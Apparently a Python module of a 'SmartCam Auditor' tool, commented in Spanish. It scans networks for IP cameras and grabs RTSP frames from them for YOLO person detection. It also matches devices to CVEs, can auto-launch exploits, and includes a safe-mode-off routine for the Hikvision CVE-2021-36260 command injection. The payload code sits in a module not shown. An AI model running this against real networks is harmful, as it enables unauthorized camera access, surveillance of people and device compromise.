"""
Módulo de escaneo de red mejorado para detectar dispositivos IoT y cámaras IP
"""

import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import ipaddress
import subprocess
import platform
import json
import os
import re
import difflib
import sqlite3

# Importaciones para análisis de video con IA
try:
    import cv2
    from ultralytics import YOLO
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

# =========================================================================
# NOTA: Las funciones de comparación de logs se han movido a scanner/diff_analyzer.py
# Para usar las funciones de análisis de diferencias, importa desde el nuevo módulo:
# 
# from scanner.diff_analyzer import (
#     obtener_logs_ordenados,
#     comparar_logs_actual_vs_anterior,
#     analizar_cambios_dispositivos,
#     generar_reporte_cambios,
#     monitorear_cambios_automatico
# )
# =========================================================================

def analizar_rtsp(rtsp_url, output_dir="scanner/detecciones"):
    """
    Analiza un stream RTSP usando YOLO para detección de objetos
    
    Args:
        rtsp_url (str): URL del stream RTSP (ej: rtsp://ip:554/stream)
        output_dir (str): Directorio donde guardar las detecciones
    
    Returns:
        dict: Resultado del análisis con información detallada
    
    Example:
        resultado = analizar_rtsp("rtsp://192.168.1.100:554/stream")
        if resultado['success']:
            print(f"Objetos detectados: {resultado['detecciones']}")
    """
    if not CV2_AVAILABLE:
        return {
            'success': False,
            'error': 'OpenCV y/o ultralytics no están disponibles',
            'detalle': 'Instalar con: pip install opencv-python ultralytics'
        }
    
    # Crear directorio de salida
    os.makedirs(output_dir, exist_ok=True)
    
    print(f"🎥 Conectando a {rtsp_url}")
    
    try:
        # Configurar captura de video con timeout
        cap = cv2.VideoCapture(rtsp_url)
        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # Reducir buffer para menor latencia
        
        # Verificar conexión
        if not cap.isOpened():
            return {
                'success': False,
                'error': 'No se pudo acceder a la cámara',
                'detalle': f'URL: {rtsp_url}'
            }
        
        # Capturar frame
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            return {
                'success': False,
                'error': 'No se pudo capturar imagen',
                'detalle': 'Stream no disponible o sin datos'
            }
        
        print(f"✅ Frame capturado exitosamente ({frame.shape[1]}x{frame.shape[0]})")
        
        # Cargar modelo YOLO
        print(f"🧠 Cargando modelo YOLO...")
        try:
            modelo = YOLO("yolov8n.pt")  # YOLOv8 nano por velocidad
        except Exception as e:
            print(f"📥 Descargando modelo YOLO por primera vez...")
            modelo = YOLO("yolov8n.pt")
        
        # Realizar detección
        print(f"🔍 Analizando imagen con IA...")
        resultados = modelo.predict(frame, conf=0.5, verbose=False)
        
        # Extraer información de detecciones
        detecciones = []
        if len(resultados) > 0:
            boxes = resultados[0].boxes
            if boxes is not None:
                for i, box in enumerate(boxes):
                    # Obtener datos de la detección
                    xyxy = box.xyxy[0].tolist()  # Coordenadas
                    conf = float(box.conf[0])    # Confianza
                    cls = int(box.cls[0])        # Clase
                    
                    # Nombre de la clase
                    class_name = modelo.names[cls]
                    
                    detecciones.append({
                        'objeto': class_name,
                        'confianza': round(conf, 2),
                        'coordenadas': {
                            'x1': int(xyxy[0]),
                            'y1': int(xyxy[1]),
                            'x2': int(xyxy[2]),
                            'y2': int(xyxy[3])
                        }
                    })
        
        # Generar nombre de archivo único
        import datetime
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        ip_clean = rtsp_url.replace('rtsp://', '').replace(':', '_').replace('/', '_')
        nombre_archivo = os.path.join(output_dir, f"deteccion_{ip_clean}_{timestamp}.jpg")
        
        # Guardar imagen con detecciones
        if len(resultados) > 0:
            resultados[0].save(filename=nombre_archivo)
        else:
            # Guardar frame original si no hay detecciones
            cv2.imwrite(nombre_archivo, frame)
        
        # Resumen de resultados
        resumen = {
            'success': True,
            'rtsp_url': rtsp_url,
            'imagen_guardada': nombre_archivo,
            'detecciones': detecciones,
            'total_objetos': len(detecciones),
            'objetos_unicos': list(set([d['objeto'] for d in detecciones])),
            'timestamp': timestamp,
            'resolucion': f"{frame.shape[1]}x{frame.shape[0]}"
        }
        
        print(f"✅ Análisis completado:")
        print(f"   📸 Imagen guardada: {nombre_archivo}")
        print(f"   🎯 Objetos detectados: {len(detecciones)}")
        
        if detecciones:
            print(f"   📋 Objetos encontrados:")
            for det in detecciones:
                print(f"      - {det['objeto']} (confianza: {det['confianza']})")
        
        return resumen
        
    except Exception as e:
        return {
            'success': False,
            'error': f'Error durante el análisis: {str(e)}',
            'detalle': f'URL: {rtsp_url}'
        }

def analizar_rtsp_masivo(dispositivos_detectados, output_dir="scanner/detecciones"):
    """
    Analiza múltiples streams RTSP de dispositivos detectados
    
    Args:
        dispositivos_detectados (list): Lista de dispositivos con información de puertos
        output_dir (str): Directorio donde guardar las detecciones
    
    Returns:
        list: Lista de resultados de análisis para cada dispositivo
    """
    if not CV2_AVAILABLE:
        print("❌ OpenCV y/o ultralytics no están disponibles")
        return []
    
    resultados = []
    dispositivos_rtsp = []
    
    # Filtrar dispositivos que probablemente tengan RTSP
    for device in dispositivos_detectados:
        if (554 in device.get('open_ports', []) or 
            8554 in device.get('open_ports', []) or
            'rtsp' in device.get('device_type', '').lower()):
            dispositivos_rtsp.append(device)
    
    if not dispositivos_rtsp:
        print("⚠️ No se encontraron dispositivos con puertos RTSP")
        return []
    
    print(f"🎥 Analizando {len(dispositivos_rtsp)} dispositivos con RTSP...")
    
    for device in dispositivos_rtsp:
        ip = device['ip']
        print(f"\n🎯 Analizando dispositivo: {ip}")
        
        # Probar URLs RTSP comunes
        rtsp_urls = [
            f"rtsp://{ip}:554/stream",
            f"rtsp://{ip}:554/live",
            f"rtsp://{ip}:554/ch0",
            f"rtsp://{ip}:554/cam/realmonitor?channel=1&subtype=0",
            f"rtsp://{ip}:8554/stream",
            f"rtsp://{ip}/live.sdp"
        ]
        
        analisis_exitoso = False
        
        for rtsp_url in rtsp_urls:
            if analisis_exitoso:
                break
                
            print(f"   🔍 Probando: {rtsp_url}")
            resultado = analizar_rtsp(rtsp_url, output_dir)
            
            if resultado['success']:
                resultado['device_info'] = device
                resultados.append(resultado)
                analisis_exitoso = True
                print(f"   ✅ Análisis exitoso para {ip}")
                break
            else:
                print(f"   ❌ Fallo: {resultado.get('error', 'Error desconocido')}")
        
        if not analisis_exitoso:
            print(f"   ⚠️ No se pudo acceder al stream RTSP de {ip}")
            resultados.append({
                'success': False,
                'device_info': device,
                'error': 'Ninguna URL RTSP funcionó',
                'rtsp_urls_probadas': rtsp_urls
            })
    
    # Resumen final
    exitosos = len([r for r in resultados if r['success']])
    print(f"\n📊 RESUMEN DE ANÁLISIS RTSP:")
    print(f"   🎯 Dispositivos analizados: {len(dispositivos_rtsp)}")
    print(f"   ✅ Análisis exitosos: {exitosos}")
    print(f"   ❌ Fallos: {len(dispositivos_rtsp) - exitosos}")
    
    if exitosos > 0:
        total_detecciones = sum([len(r.get('detecciones', [])) for r in resultados if r['success']])
        print(f"   🎯 Total objetos detectados: {total_detecciones}")
    
    return resultados

class NetworkScanner:
    def __init__(self, timeout=1.0, max_threads=100, config_file="config/config.json"):
        self.timeout = timeout
        self.max_threads = max_threads
        self.found_devices = []
        self.lock = threading.Lock()
        self.config = self.load_config(config_file)
        
        # Configuración de base de datos
        self.db_file = self.config.get('database_file', 'shodan_local.db')
        self.enable_database = self.config.get('enable_database', True)
        
        # Inicializar base de datos si está habilitada
        if self.enable_database:
            crear_base_datos(self.db_file)
        
        # Usar puertos de configuración o valores por defecto
        self.camera_ports = self.config.get('camera_ports', [80, 8080, 554, 8554, 443, 8000, 8081, 8090, 9999, 10001])
        
        # Aplicar configuraciones del archivo
        scan_settings = self.config.get('scan_settings', {})
        self.timeout = scan_settings.get('timeout', timeout)
        self.max_threads = scan_settings.get('max_threads', max_threads)
        
        # Servicios típicos para identificar dispositivos IoT
        self.iot_indicators = {
            80: "HTTP Web Interface",
            443: "HTTPS Web Interface", 
            554: "RTSP Stream",
            8080: "HTTP Alternative",
            8081: "HTTP Management",
            8554: "RTSP Alternative",
            8000: "HTTP Streaming",
            8090: "HTTP Admin",
            9999: "IoT Management",
            10001: "Camera Control",
            23: "Telnet",
            22: "SSH",
            21: "FTP"
        }
        
        # Inicializar notificador de Telegram si está disponible
        try:
            from .telegram_notifier import TelegramNotifier
            self.telegram = TelegramNotifier(config_file=config_file)
        except ImportError:
            self.telegram = None
        
        # Inicializar CVE checker si está disponible
        try:
            from .cve_checker import CVEChecker
            self.cve_checker = CVEChecker(config_file=config_file)
            self.check_cves = self.config.get('auto_check_cves', True)
        except ImportError:
            self.cve_checker = None
            self.check_cves = False
        
        # Inicializar exploit launcher si está disponible
        try:
            from .exploit_launcher import ExploitLauncher
            self.exploit_launcher = ExploitLauncher(config_file=config_file)
            self.auto_exploit = self.config.get('auto_launch_exploits', False)
        except ImportError:
            self.exploit_launcher = None
            self.auto_exploit = False
        
        # Configuración para análisis RTSP con IA
        self.auto_rtsp_analysis = self.config.get('auto_rtsp_analysis', False)
        self.rtsp_output_dir = self.config.get('rtsp_output_dir', 'scanner/detecciones')
        
        # Crear base de datos local tipo Shodan
        self.db_file = "shodan_local.db"
        crear_base_datos(self.db_file)
    
    def load_config(self, config_file):
        """Carga la configuración desde archivo JSON"""
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                print(f"[✓] Configuración cargada desde {config_file}")
                return config
            else:
                print(f"[WARNING] Archivo de configuración no encontrado: {config_file}")
                return {}
        except Exception as e:
            print(f"[ERROR] Error cargando configuración: {e}")
            return {}
    
    def scan_port(self, ip, port):
        """Escanea un puerto específico en una IP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def identify_device_type(self, ip, open_ports):
        """Identifica el tipo de dispositivo basado en puertos abiertos"""
        device_type = "Unknown"
        confidence = 0
        services = []
        
        for port in open_ports:
            if port in self.iot_indicators:
                services.append(f"{port}/{self.iot_indicators[port]}")
        
        # Lógica de identificación
        if 554 in open_ports or 8554 in open_ports:
            device_type = "IP Camera (RTSP)"
            confidence = 85
        elif 80 in open_ports and any(p in open_ports for p in [8080, 8081, 8000]):
            device_type = "IP Camera (HTTP)"
            confidence = 75
        elif 80 in open_ports or 443 in open_ports:
            device_type = "Web Device (Possible Camera)"
            confidence = 60
        elif 23 in open_ports:  # Telnet - común en dispositivos IoT inseguros
            device_type = "IoT Device (Telnet)"
            confidence = 70
        elif any(p in open_ports for p in [8000, 9999, 10001]):
            device_type = "IoT Device"
            confidence = 65
        
        return device_type, confidence, services
    
    def scan_device(self, ip):
        """Escanea todos los puertos relevantes de un dispositivo"""
        ip_str = str(ip)
        open_ports = []
        
        # Primero verificar si el host responde (ping rápido)
        if not self.is_host_alive(ip_str):
            return None
        
        # Escanear puertos comunes de cámaras/IoT
        for port in self.camera_ports + [22, 23, 21]:
            if self.scan_port(ip_str, port):
                open_ports.append(port)
        
        if open_ports:
            device_type, confidence, services = self.identify_device_type(ip_str, open_ports)
            
            device_info = {
                'ip': ip_str,
                'open_ports': open_ports,
                'device_type': device_type,
                'confidence': confidence,
                'services': services,
                'scan_time': time.strftime('%Y-%m-%d %H:%M:%S')
            }
            
            with self.lock:
                self.found_devices.append(device_info)
                print(f"    [+] {ip_str} - {device_type} (Confianza: {confidence}%) - Puertos: {open_ports}")
            
            # Almacenar en base de datos local tipo Shodan
            insertar_dispositivo(
                self.db_file, 
                ip_str, 
                open_ports[0] if open_ports else None,  # Puerto principal
                services[0] if services else None,      # Servicio principal
                None,                                    # Sistema operativo (desconocido por ahora)
                None,                                    # Marca (desconocida por ahora)
                None,                                    # Vulnerabilidad (ninguna por defecto)
                device_type,                             # Tipo de dispositivo
                confidence,                              # Confianza
                open_ports,                              # Lista de puertos abiertos
                None                                     # CVEs encontrados (ninguno por ahora)
            )
            
            return device_info
        
        return None
    
    def is_host_alive(self, ip):
        """Verifica si un host está vivo usando ping o conexión rápida"""
        try:
            # Método 1: Ping rápido
            param = '-n' if platform.system().lower() == 'windows' else '-c'
            cmd = ['ping', param, '1', '-W' if platform.system().lower() == 'windows' else '-W', '1000', ip]
            
            result = subprocess.run(cmd, capture_output=True, timeout=2)
            if result.returncode == 0:
                return True
            
            # Método 2: Conexión rápida al puerto 80 como fallback
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, 80))
            sock.close()
            return result == 0
            
        except:
            return False
    
    def scan_network(self, network_range):
        """
        Escanea una red completa en busca de dispositivos IoT/cámaras
        
        Args:
            network_range (str): Rango de red en formato CIDR (ej: 192.168.1.0/24)
        
        Returns:
            list: Lista de dispositivos encontrados con información detallada
        """
        print(f"[*] Iniciando escaneo avanzado de red: {network_range}")
        print(f"[*] Buscando dispositivos IoT y cámaras IP...")
        
        try:
            network = ipaddress.IPv4Network(network_range, strict=False)
        except ValueError as e:
            print(f"[ERROR] Formato de red inválido: {e}")
            return []
        
        # Obtener lista de IPs a escanear
        hosts = list(network.hosts())
        
        # Limitar escaneo para redes muy grandes
        if len(hosts) > 254:
            print(f"[WARNING] Red muy grande ({len(hosts)} hosts). Limitando a los primeros 254.")
            hosts = hosts[:254]
        
        print(f"[*] Escaneando {len(hosts)} hosts con {self.max_threads} hilos...")
        
        start_time = time.time()
        
        # Escaneo paralelo
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self.scan_device, ip) for ip in hosts]
            
            # Mostrar progreso
            completed = 0
            for future in futures:
                future.result()  # Esperar completación
                completed += 1
                if completed % 50 == 0:
                    print(f"    [*] Progreso: {completed}/{len(hosts)} hosts escaneados...")
        
        scan_time = time.time() - start_time
        
        print(f"\n[*] Escaneo completado en {scan_time:.2f} segundos")
        print(f"[*] Dispositivos encontrados: {len(self.found_devices)}")
        
        # Análisis CVE automático si está habilitado
        if self.check_cves and self.cve_checker and self.found_devices:
            print(f"\n[*] Iniciando análisis automático de vulnerabilidades CVE...")
            # Usar la versión mejorada que integra el código del usuario
            self.analyze_cve_vulnerabilities_enhanced()
        
        # Análisis RTSP automático si está habilitado
        if self.auto_rtsp_analysis and CV2_AVAILABLE and self.found_devices:
            print(f"\n[*] Iniciando análisis automático de streams RTSP con IA...")
            rtsp_results = analizar_rtsp_masivo(self.found_devices, self.rtsp_output_dir)
            
            # Integrar resultados RTSP en los dispositivos
            self._integrate_rtsp_results(rtsp_results)
        
        # Mostrar resumen
        if self.found_devices:
            print(f"\n[RESUMEN DE DISPOSITIVOS ENCONTRADOS]")
            print("-" * 60)
            for device in self.found_devices:
                print(f"IP: {device['ip']}")
                print(f"Tipo: {device['device_type']} (Confianza: {device['confidence']}%)")
                print(f"Puertos abiertos: {device['open_ports']}")
                print(f"Servicios: {', '.join(device['services'])}")
                print("-" * 40)
        
        return self.found_devices
    
    def analyze_cve_vulnerabilities(self):
        """Analiza vulnerabilidades CVE en los dispositivos encontrados"""
        if not self.cve_checker:
            return
        
        print(f"🧬 Analizando vulnerabilidades CVE en {len(self.found_devices)} dispositivos...")
        
        # Preparar lista de targets para análisis CVE
        targets_for_cve = []
        
        for device in self.found_devices:
            ip = device['ip']
            device_type = device['device_type']
            
            # Agregar IP para detección automática
            targets_for_cve.append(ip)
            
            # Agregar identificador específico si conocemos el fabricante
            if 'hikvision' in device_type.lower():
                targets_for_cve.append('Hikvision device')
            elif 'dahua' in device_type.lower():
                targets_for_cve.append('Dahua device')
            elif 'axis' in device_type.lower():
                targets_for_cve.append('Axis device')
            elif 'foscam' in device_type.lower():
                targets_for_cve.append('Foscam device')
        
        # Buscar vulnerabilidades CVE
        vulnerabilidades = self.cve_checker.buscar_vulnerabilidades_cve(targets_for_cve)
        
        if vulnerabilidades:
            print(f"🚨 Se encontraron {len(vulnerabilidades)} vulnerabilidades CVE")
            
            # Agregar información de CVE a los dispositivos
            for device in self.found_devices:
                device_cves = []
                for vuln in vulnerabilidades:
                    if vuln.get('ip') == device['ip'] or device['device_type'].lower() in vuln['producto'].lower():
                        device_cves.append({
                            'cve': vuln['cve'],
                            'descripcion': vuln['descripcion'],
                            'critico': vuln['critico'],
                            'cvss_score': vuln.get('cvss_score', 0)
                        })
                
                device['cves_found'] = device_cves
                device['cve_count'] = len(device_cves)
                device['critical_cves'] = len([c for c in device_cves if c['critico']])
            
            # Mostrar resumen de vulnerabilidades críticas
            critical_devices = [d for d in self.found_devices if d.get('critical_cves', 0) > 0]
            if critical_devices:
                print(f"\n⚠️ DISPOSITIVOS CON VULNERABILIDADES CRÍTICAS:")
                for device in critical_devices:
                    print(f"   🔴 {device['ip']} ({device['device_type']}) - {device['critical_cves']} CVEs críticos")
            
            # Notificar por Telegram si está configurado
            if self.telegram and self.telegram.is_enabled():
                vuln_summary = {
                    'total_vulnerabilities': len(vulnerabilidades),
                    'critical_vulnerabilities': len([v for v in vulnerabilidades if v['critico']]),
                    'affected_devices': len([d for d in self.found_devices if d.get('cve_count', 0) > 0])
                }
                self.telegram.notify_vulnerabilities_found(vuln_summary)
        else:
            print(f"✅ No se encontraron vulnerabilidades CVE conocidas")
            
            # Agregar información vacía de CVE a los dispositivos
            for device in self.found_devices:
                device['cves_found'] = []
                device['cve_count'] = 0
                device['critical_cves'] = 0
    
    def analyze_cve_vulnerabilities_enhanced(self):
        """
        Análisis CVE mejorado usando el código del usuario integrado
        """
        if not self.cve_checker:
            return
        
        # Importar utilidades de logging
        try:
            from utils.logging_utils import registrar_log
        except ImportError:
            # Fallback a print si no está disponible
            def registrar_log(msg, level="INFO", cat=None):
                print(f"[{level}] {msg}")
        
        registrar_log(f"🧬 Analizando vulnerabilidades CVE en {len(self.found_devices)} dispositivos...")
        
        # Preparar identificadores como en el código del usuario
        identificados = []
        
        for device in self.found_devices:
            ip = device['ip']
            device_type = device['device_type']
            
            # Agregar IP para detección automática
            identificados.append(ip)
            
            # Agregar identificador específico basado en detección de fabricante
            if 'hikvision' in device_type.lower():
                identificados.append('Hikvision DS-2CD')  # Formato que coincide con CVE DB
            elif 'dahua' in device_type.lower():
                identificados.append('Dahua IPC-HDW')
            elif 'axis' in device_type.lower():
                identificados.append('Axis Q3517')
            elif 'foscam' in device_type.lower():
                identificados.append('Foscam C1')
            elif 'amcrest' in device_type.lower():
                identificados.append('Amcrest IP2M')
        
        # =========================================================================
        # CÓDIGO CVE DEL USUARIO - Integración directa
        # =========================================================================
        
        # Solo ejemplo de marcas detectadas por fingerprint o login
        # identificados ya contiene los dispositivos detectados
        
        if self.config.get("enable_cve_check", True):
            registrar_log("🧬 Buscando CVEs...", "CVE")
            
            try:
                # Usar la función CVE del usuario
                from scanner.cve_checker import buscar_vulnerabilidades_cve
                cves = buscar_vulnerabilidades_cve(identificados)
                
                if cves:
                    registrar_log(f"🚨 Se encontraron {len(cves)} vulnerabilidades", "WARNING")
                    
                    # Código del usuario mejorado con logging
                    for cve in cves:
                        nivel = "CRITICAL" if cve['critico'] else "WARNING"
                        registrar_log(f" -> [{cve['cve']}] {cve['producto']} - {cve['descripcion']}", nivel)
                        
                        # Información adicional
                        if cve.get('cvss_score'):
                            registrar_log(f"    📊 CVSS Score: {cve['cvss_score']}")
                        if cve.get('exploit_disponible'):
                            exploit_msg = "💥 Exploit disponible" if cve['exploit_disponible'] else "⚪ Sin exploit"
                            registrar_log(f"    {exploit_msg}")
                        if cve.get('mitigacion'):
                            registrar_log(f"    🛡️ Mitigación: {cve['mitigacion']}")
                    
                    # Integrar resultados CVE en los dispositivos encontrados
                    self._integrate_cve_results(cves)
                    
                    # Mostrar resumen de dispositivos críticos
                    critical_devices = [d for d in self.found_devices if d.get('critical_cves', 0) > 0]
                    if critical_devices:
                        registrar_log(f"\n⚠️ DISPOSITIVOS CON VULNERABILIDADES CRÍTICAS:", "CRITICAL")
                        for device in critical_devices:
                            registrar_log(f"   🔴 {device['ip']} ({device['device_type']}) - {device['critical_cves']} CVEs críticos", "CRITICAL")
                    
                    # Notificación Telegram
                    if self.telegram and self.telegram.is_enabled():
                        vuln_summary = {
                            'total_vulnerabilities': len(cves),
                            'critical_vulnerabilities': len([v for v in cves if v['critico']]),
                            'affected_devices': len([d for d in self.found_devices if d.get('cve_count', 0) > 0])
                        }
                        self.telegram.notify_vulnerabilities_found(vuln_summary)
                    
                    # Lanzar exploits automáticamente si está habilitado
                    if self.auto_exploit and self.exploit_launcher:
                        registrar_log("🚀 Iniciando lanzamiento automático de exploits...", "EXPLOIT")
                        self._launch_automated_exploits(cves)
                    
                    return cves
                    
                else:
                    # Código del usuario - caso sin CVEs
                    registrar_log(" -> No se encontraron CVEs.", "SUCCESS")
                    
                    # Inicializar información CVE vacía
                    for device in self.found_devices:
                        device['cves_found'] = []
                        device['cve_count'] = 0
                        device['critical_cves'] = 0
                    
                    return []
                    
            except Exception as e:
                registrar_log(f"❌ Error en búsqueda CVE: {e}", "ERROR")
                return []
        else:
            registrar_log("⚪ Verificación CVE deshabilitada en configuración", "INFO")
            return []
    
    def _integrate_cve_results(self, cves):
        """Integra los resultados CVE en la información de dispositivos"""
        for device in self.found_devices:
            device_cves = []
            ip = device['ip']
            device_type = device['device_type'].lower()
            
            # Buscar CVEs que coincidan con este dispositivo
            for vuln in cves:
                vuln_ip = vuln.get('ip')
                vuln_producto = vuln.get('producto', '').lower()
                
                # Coincidencia por IP o por tipo de dispositivo
                if (vuln_ip == ip or 
                    any(marca in device_type and marca in vuln_producto 
                        for marca in ['hikvision', 'dahua', 'axis', 'foscam', 'amcrest'])):
                    
                    device_cves.append({
                        'cve': vuln['cve'],
                        'descripcion': vuln['descripcion'],
                        'critico': vuln['critico'],
                        'cvss_score': vuln.get('cvss_score', 0),
                        'exploit_disponible': vuln.get('exploit_disponible', False),
                        'mitigacion': vuln.get('mitigacion', '')
                    })
            
            # Agregar información CVE al dispositivo
            device['cves_found'] = device_cves
            device['cve_count'] = len(device_cves)
            device['critical_cves'] = len([c for c in device_cves if c['critico']])
            device['exploitable_cves'] = len([c for c in device_cves if c.get('exploit_disponible')])
            
            # Calcular nivel de riesgo del dispositivo
            if device['critical_cves'] > 0:
                device['risk_level'] = 'CRITICAL'
            elif device['cve_count'] >= 3:
                device['risk_level'] = 'HIGH'
            elif device['cve_count'] >= 1:
                device['risk_level'] = 'MEDIUM'
            else:
                device['risk_level'] = 'LOW'
    
    def _launch_automated_exploits(self, cves_encontrados):
        """
        Lanza exploits automáticamente para las vulnerabilidades encontradas
        
        Args:
            cves_encontrados (list): Lista de CVEs detectados
        """
        try:
            # Importar utilidades de logging
            try:
                from utils.logging_utils import registrar_log
            except ImportError:
                def registrar_log(msg, level="INFO", cat=None):
                    print(f"[{level}] {msg}")
            
            # Crear mapeo de productos a IPs
            ip_por_dispositivo = {}
            for device in self.found_devices:
                if device.get('cve_count', 0) > 0:
                    # Usar el tipo de dispositivo como identificador
                    device_type = device['device_type']
                    ip = device['ip']
                    
                    # Mapear fabricantes conocidos
                    if 'hikvision' in device_type.lower():
                        ip_por_dispositivo['Hikvision DS-2CD2042FWD'] = ip
                        ip_por_dispositivo['Hikvision DS-2CD'] = ip
                    elif 'dahua' in device_type.lower():
                        ip_por_dispositivo['Dahua IPC-HDW'] = ip
                        ip_por_dispositivo['Dahua Technology'] = ip
                    else:
                        # Usar el tipo de dispositivo directamente
                        ip_por_dispositivo[device_type] = ip
            
            if not ip_por_dispositivo:
                registrar_log("⚠️ No se encontraron dispositivos vulnerables para explotar", "WARNING")
                return
            
            registrar_log(f"🎯 Dispositivos objetivo para exploits: {len(ip_por_dispositivo)}", "EXPLOIT")
            
            # Lanzar exploits
            resultados = self.exploit_launcher.lanzar_exploits(cves_encontrados, ip_por_dispositivo)
            
            # Integrar resultados de exploits en los dispositivos
            self._integrate_exploit_results(resultados)
            
            registrar_log(f"🚀 Exploits completados: {len(resultados)} intentos", "EXPLOIT")
            
            # Notificar por Telegram si hay exploits exitosos
            exploits_exitosos = [r for r in resultados if r.get('resultado') == 'EXITOSO']
            if exploits_exitosos and self.telegram and self.telegram.is_enabled():
                for resultado in exploits_exitosos:
                    self.telegram.notify_exploit_success(
                        resultado['cve'], 
                        resultado['ip'], 
                        resultado.get('detalle', 'Exploit ejecutado exitosamente')
                    )
            
        except Exception as e:
            registrar_log(f"❌ Error en lanzamiento automático de exploits: {e}", "ERROR")
    
    def _integrate_exploit_results(self, exploit_results):
        """
        Integra los resultados de exploits en la información de dispositivos
        
        Args:
            exploit_results (list): Lista de resultados de exploits
        """
        for device in self.found_devices:
            device_ip = device['ip']
            device_exploits = []
            
            # Buscar resultados de exploits para este dispositivo
            for resultado in exploit_results:
                if resultado.get('ip') == device_ip:
                    device_exploits.append({
                        'cve': resultado.get('cve'),
                        'resultado': resultado.get('resultado'),
                        'vulnerable': resultado.get('vulnerable', False),
                        'detalle': resultado.get('detalle', ''),
                        'timestamp': resultado.get('timestamp')
                    })
            
            # Agregar información de exploits al dispositivo
            device['exploits_executed'] = device_exploits
            device['exploit_count'] = len(device_exploits)
            device['successful_exploits'] = len([e for e in device_exploits if e.get('resultado') == 'EXITOSO'])
            
            # Actualizar nivel de riesgo si hay exploits exitosos
            if device.get('successful_exploits', 0) > 0:
                device['risk_level'] = 'COMPROMISED'
    
    def _integrate_rtsp_results(self, rtsp_results):
        """
        Integra los resultados de análisis RTSP en la información de dispositivos
        
        Args:
            rtsp_results (list): Lista de resultados de análisis RTSP
        """
        for device in self.found_devices:
            device_ip = device['ip']
            
            # Buscar resultado RTSP para este dispositivo
            device_rtsp = None
            for rtsp_result in rtsp_results:
                if rtsp_result.get('device_info', {}).get('ip') == device_ip:
                    device_rtsp = rtsp_result
                    break
            
            if device_rtsp:
                # Agregar información RTSP al dispositivo
                device['rtsp_analysis'] = {
                    'success': device_rtsp['success'],
                    'total_objetos': device_rtsp.get('total_objetos', 0),
                    'objetos_detectados': device_rtsp.get('objetos_unicos', []),
                    'imagen_guardada': device_rtsp.get('imagen_guardada'),
                    'detecciones_detalladas': device_rtsp.get('detecciones', [])
                }
                
                # Actualizar tipo de dispositivo si se confirmó que es una cámara
                if device_rtsp['success'] and device_rtsp.get('total_objetos', 0) > 0:
                    if 'Unknown' in device['device_type'] or 'Possible Camera' in device['device_type']:
                        device['device_type'] = "IP Camera (RTSP Confirmed)"
                        device['confidence'] = max(device['confidence'], 90)
                
                # Marcar como cámara activa
                device['camera_active'] = device_rtsp['success']
                device['has_video_stream'] = device_rtsp['success']
                
                # Agregar información de seguridad si hay personas detectadas
                if device_rtsp['success']:
                    objetos = device_rtsp.get('objetos_unicos', [])
                    if 'person' in objetos:
                        device['security_alert'] = True
                        device['people_detected'] = len([d for d in device_rtsp.get('detecciones', []) if d['objeto'] == 'person'])
                    else:
                        device['security_alert'] = False
                        device['people_detected'] = 0
            else:
                # No se pudo analizar RTSP
                device['rtsp_analysis'] = {
                    'success': False,
                    'error': 'No se pudo acceder al stream RTSP'
                }
                device['camera_active'] = False
                device['has_video_stream'] = False
    
    def get_local_network(self):
        """Detecta automáticamente la red local"""
        try:
            # Obtener la IP local
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(("8.8.8.8", 80))
            local_ip = sock.getsockname()[0]
            sock.close()
            
            # Asumir máscara /24 para redes domésticas típicas
            network_base = '.'.join(local_ip.split('.')[:-1]) + '.0/24'
            print(f"[*] Red local detectada: {network_base}")
            return network_base
            
        except Exception as e:
            print(f"[WARNING] No se pudo detectar la red local: {e}")
            return "192.168.1.0/24"  # Fallback común

    def exploit_target(self, target_ip, target_port=80, cve_id="CVE-2021-36260", endpoint="/SDK/webLanguage"):
        """
        Lanza un exploit específico contra un target
        Equivalente a usar auxiliary/scanner/http/hikvision_cmd_injection en Metasploit
        
        Args:
            target_ip (str): IP del target (RHOSTS en Metasploit)
            target_port (int): Puerto del target (RPORT en Metasploit)
            cve_id (str): CVE a explotar
            endpoint (str): Endpoint específico (TARGETURI en Metasploit)
        
        Returns:
            dict: Resultado del exploit
        """
        print(f"🎯 SmartCam Auditor - Exploit Target")
        print(f"   Target: {target_ip}:{target_port}")
        print(f"   CVE: {cve_id}")
        print(f"   Endpoint: {endpoint}")
        print()
        
        try:
            # Verificar si el exploit launcher está disponible
            if not self.exploit_launcher:
                try:
                    from .exploit_launcher import ExploitLauncher
                    self.exploit_launcher = ExploitLauncher(config_file=self.config.get('config_file', 'config/config.json'))
                except ImportError:
                    print("❌ Módulo de exploits no disponible")
                    return {'error': 'Exploit launcher no disponible'}
            
            # Configurar modo real para exploit específico
            original_safe_mode = self.exploit_launcher.safe_mode
            self.exploit_launcher.safe_mode = False  # Modo real como Metasploit
            
            print(f"🚀 Lanzando exploit {cve_id}...")
            
            # Ejecutar exploit
            resultado = self.exploit_launcher.lanzar_exploit(cve_id, target_ip, target_port)
            
            # Restaurar modo seguro original
            self.exploit_launcher.safe_mode = original_safe_mode
            
            # Mostrar resultados como en Metasploit
            if resultado.get('exploit_exitoso'):
                print(f"✅ [+] {target_ip}:{target_port} - VULNERABLE!")
                print(f"✅ [+] Command injection successful")
                print(f"✅ [+] Endpoint: {resultado.get('endpoint', endpoint)}")
                
                if resultado.get('comando_ejecutado'):
                    print(f"📤 [+] Command executed: {resultado['comando_ejecutado']}")
                
                if resultado.get('respuesta_servidor'):
                    respuesta = resultado['respuesta_servidor'][:200]
                    print(f"📄 [+] Server response: {respuesta}...")
                
            else:
                print(f"❌ [-] {target_ip}:{target_port} - Not vulnerable")
                if resultado.get('detalle'):
                    print(f"❌ [-] {resultado['detalle']}")
            
            return resultado
            
        except Exception as e:
            error_msg = f"Error ejecutando exploit: {str(e)}"
            print(f"❌ {error_msg}")
            return {'error': error_msg}

    def metasploit_style_scan(self, rhosts, rport=80, targeturi="/SDK/webLanguage"):
